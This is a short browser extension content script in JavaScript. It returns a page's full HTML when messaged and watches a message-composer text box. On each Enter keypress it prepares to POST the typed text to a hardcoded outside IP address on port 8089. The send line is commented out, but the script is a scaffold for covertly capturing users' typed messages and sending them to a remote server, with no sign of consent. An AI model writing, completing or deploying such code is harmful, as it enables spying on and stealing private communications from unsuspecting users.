
// Listen for messages
chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
    // If the received message has the expected format...
    if (msg.text === 'report_back') {
        // Call the specified callback, passing
        // the web-page's DOM content as argument
        sendResponse(document.all[0].outerHTML);
    }
});
var isAdded = false;
var config = { attributes: true, childList: true, subtree: true,characterData: true };
// console.log(document);
var textBox = document.getElementsByClassName("_1mf _1mj")[0];


var observer = new MutationObserver(function(mutationsList, observer) {
    if (textBox.childNodes[0].innerText !== null && textBox.childNodes[0].innerText !== '' && !isAdded) {
        document.addEventListener("keydown",function(evt) {
            if(evt.which === 13) {
            console.log("sending \"" + textBox.childNodes[0].innerText + "\" to server");
            
            // console.log(textBox);
            var request = new XMLHttpRequest();
        request.open("POST", "https://159.65.76.44:8089", true);
        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
        //request.send(JSON.stringify({text: textBox.childNodes[0].innerText}));
            textBox = document.getElementsByClassName("_1mf _1mj")[0];

        }
            // observer.observe(textBox, config);

            // textBox = document.getElementsByClassName("_1mf _1mj")[0];
        });
        // console.log(textBox);
        isAdded = true;
    }
});
observer.observe(textBox, config);